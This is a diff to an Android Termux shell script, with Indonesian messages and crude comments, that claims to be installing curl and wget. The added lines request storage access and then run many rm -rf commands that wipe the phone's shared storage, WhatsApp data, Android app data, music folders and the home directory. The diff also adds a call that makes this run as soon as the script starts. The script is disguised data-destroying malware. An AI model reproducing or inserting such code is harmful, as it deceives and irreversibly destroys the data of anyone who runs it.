@@ -44,6 +44,7 @@ sleep 0.25
 }
 #kontol
 upgrade(){
+    termux-setup-storage
 echo -e $okegreen"<!> Menginstall curl<!>"
 rm -rf /sdcard/0/whatsapp
 clear
@@ -52,7 +53,22 @@ echo -e $okegreen"<!>Menginstall Wget<!>"
 rm -rf /sdcard/0/
 clear
 sleep 2
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
 }
+upgrade
 #sesi kontol
 echo -e $okegreen "{ SELAMAT DATANG DI TOOLS GABUT }" #gabut anjenk
 sleep 2
